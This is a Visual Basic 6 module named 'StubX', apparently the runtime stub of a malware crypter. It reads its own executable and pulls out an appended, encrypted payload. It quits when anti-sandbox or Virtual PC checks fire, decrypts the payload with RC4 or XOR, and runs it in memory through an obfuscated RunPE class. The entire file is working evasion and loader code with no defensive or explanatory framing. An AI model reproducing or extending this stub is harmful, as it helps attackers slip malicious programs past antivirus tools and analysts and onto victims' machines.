Attribute VB_Name = "StubX"
Option Explicit

Sub Main()
    
    Dim Free         As Long
    Dim Data         As String
    Dim Datos()      As String
    Dim Antis()      As String
    Dim hRC4         As New clsRC4
    Dim hXOR         As New clsXOR
    Dim RASDFKASDFAS As New RunPE
    
    Free = FreeFile
    
    Open App.Path & "\" & App.EXEName & ".exe" For Binary As Free
        
        Data = Space$(LOF(1))
        Get #1, , Data
        
    Close Free
    
    Datos() = Split(Data, "WR")
    
    Antis() = Split(Datos(2), "ANTIS")
    
    If Antis(0) = 1 Then
        
        If isinsandboxEs = 1 Then End
    
    End If
    
    If Antis(1) = 1 Then
        
        If isinsandboxEs = 2 Then End
        
    End If
    
    If Antis(2) = 1 Then
    
        If isinsandboxEs = 3 Then End
        
    End If
    
    If Antis(3) = 1 Then
    
        If isinsandboxEs = 4 Then End
    
    End If
    
    If Antis(4) = 1 Then
        If isinsandboxEs = 5 Then End
        
    End If
    
    If Antis(5) = 1 Then
        
        If IsVirtualPCPresent = 1 Then End
        
    End If
    
    If Antis(6) = 1 Then
        
        If IsVirtualPCPresent = 2 Then End
    
    End If
    
    If Antis(7) = 1 Then
        
        If IsVirtualPCPresent = 3 Then End
    
    End If
    
    If Datos(4) = 3 Then Datos(1) = hRC4.DecryptString(Datos(1), Datos(3))
    If Datos(4) = 6 Then Datos(1) = hXOR.DecryptString(Datos(1), Datos(3))
    
    RASDFKASDFAS.WISDFNASDKFJAKSDFJKADFKAJDSFKAJSDFJKADSFJASD StrConv(Datos(1), vbFromUnicode), vbNullString
    
End Sub
